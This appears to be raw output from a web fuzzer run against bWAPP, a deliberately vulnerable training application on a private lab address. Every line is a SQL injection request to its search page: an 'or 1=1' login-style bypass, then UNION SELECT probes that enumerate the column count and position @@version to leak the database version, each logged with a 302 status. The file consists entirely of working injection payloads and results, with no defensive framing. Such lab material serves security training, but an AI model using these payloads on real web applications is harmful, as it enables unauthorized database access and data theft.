1,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=﻿'%20or%201=1%20--
2,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201--
3,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='====%20GET%20Search%20==='
4,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201--
5,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2--"
6,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3--"
7,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4--"
15,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,10,11,12--"
8,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5--"
10,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7--"
11,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8--"
12,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9--"
13,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,10--"
9,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6--"
16,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,10,11,12,13--"
14,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,10,11--"
18,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15--"
17,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,10,11,12,13,14--"
21,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--"
20,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--"
19,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--"
23,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--"
22,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--"
25,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
26,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20@@version--
24,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
28,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20@@version,2,3--"
27,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20@@version,2--"
30,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20@@version,2,3,4,5--"
29,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20@@version,2,3,4--"
31,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20@@version,2,3,4,5,6--"
32,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20@@version,2,3,4,5,6,7--"
33,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20@@version,2,3,4,5,6,7,8--"
35,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20@@version,2,3,4,5,6,7,8,9,10--"
36,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
34,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20@@version,2,3,4,5,6,7,8.9--"
37,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,@@version,3--"
38,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,@@version,3,4--"
39,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,@@version,3,4,5--"
40,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,@@version,3,4,5,6--"
43,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,@@version,3,4,5,6,7,8,9--"
45,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
41,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,@@version,3,4,5,6,7--"
42,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,@@version,3,4,5,6,7,8--"
47,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,@@version,5,6,7,8,9,10--"
44,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,@@version,3,4,5,6,7,8,9,10--"
46,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,@@version,4,5,6,7,8,9,10--"
48,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,@@version,6,7,8,9,10--"
50,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,6,@@version,8,9,10--"
49,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,@@version,7,8,9,10--"
